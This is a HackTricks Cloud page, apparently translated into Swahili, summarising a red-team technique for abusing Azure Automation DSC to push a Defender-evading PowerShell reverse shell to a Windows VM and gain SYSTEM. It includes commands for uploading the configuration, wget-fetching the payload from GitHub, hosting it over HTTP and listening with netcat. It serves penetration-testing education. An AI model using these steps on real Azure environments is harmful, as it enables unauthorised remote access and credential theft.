# Az - Hali ya Utekelezaji wa RCE

{% hint style="success" %}
Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>unga mkono HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

**Angalia chapisho kamili hapa: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### Muhtasari wa Maandalizi na Hatua za Miundombinu ya Seva ya Mbali (C2)

#### Muhtasari
Mchakato unahusisha kuweka miundombinu ya seva ya mbali kuhifadhi mzigo uliobadilishwa wa Nishang `Invoke-PowerShellTcp.ps1`, unaoitwa `RevPS.ps1`, ulioundwa kuvuka Windows Defender. Mzigo huo unahudumiwa kutoka kwa mashine ya Kali Linux yenye IP `40.84.7.74` kwa kutumia seva rahisi ya HTTP ya Python. Operesheni inatekelezwa kupitia hatua kadhaa:

#### Hatua 1 ‚Äî Unda Faili
- **Faili Zinazohitajika:** Inahitajika hati mbili za PowerShell:
1. `reverse_shell_config.ps1`: Faili ya Hali ya Matarajio ya Ustawishaji (DSC) ambayo inapata na kutekeleza mzigo. Inapatikana kwenye [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1).
2. `push_reverse_shell_config.ps1`: Hati ya kuchapisha usanidi kwenye VM, inapatikana kwenye [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1).
- **Ubadilishaji:** Vigezo na marameteri katika faili hizi lazima zibadilishwe kulingana na mazingira maalum ya mtumiaji, ikiwa ni pamoja na majina ya rasilimali, njia za faili, na vitambulisho vya seva/mzigo.

#### Hatua 2 ‚Äî Pakia Faili ya Usanidi kwenye Zip
- `reverse_shell_config.ps1` inafungwa katika faili ya `.zip`, ikifanya iwe tayari kwa uhamisho kwenye Akaunti ya Uhifadhi ya Azure.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### Hatua ya 3 ‚Äî Weka Muktadha wa Uhifadhi & Pakia
- Faili iliyozipwa ya usanidi inapakiwa kwenye chombo kilichopangwa mapema cha Uhifadhi wa Azure, azure-pentest, kwa kutumia amri ya Set-AzStorageBlobContent ya Azure.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### Hatua ya 4 ‚Äî Andaa Kali Box
- Seva ya Kali inapakua mzigo wa RevPS.ps1 kutoka kwenye hazina ya GitHub.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
- Skripti imehaririwa ili kufafanua lengo la VM ya Windows na bandari kwa reverse shell.

#### Hatua 5 ‚Äî Chapisha Faili ya Mipangilio
- Faili ya mipangilio inatekelezwa, ikisababisha skripti ya reverse-shell kuwekwa kwenye eneo lililoelezwa kwenye VM ya Windows.

#### Hatua 6 ‚Äî Mwenyeji wa Mzigo na Kuweka Msikilizaji
- Python SimpleHTTPServer inaanzishwa kuhifadhi mzigo, pamoja na msikilizaji wa Netcat kukamata miunganisho inayoingia.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- Kazi iliyopangwa inatekeleza mzigo, ikipata mamlaka ya kiwango cha SYSTEM.

#### Hitimisho

Utekelezaji mafanikio wa mchakato huu hufungua uwezekano mwingi kwa hatua zaidi, kama vile kuvuja kwa siri za uthibitisho au kupanua shambulio kwa VM nyingi. Mwongozo unahimiza ujifunzaji endelevu na ubunifu katika uwanja wa Azure Automation DSC.

{% hint style="success" %}
Jifunze & zoezi Udukuzi wa AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & zoezi Udukuzi wa GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
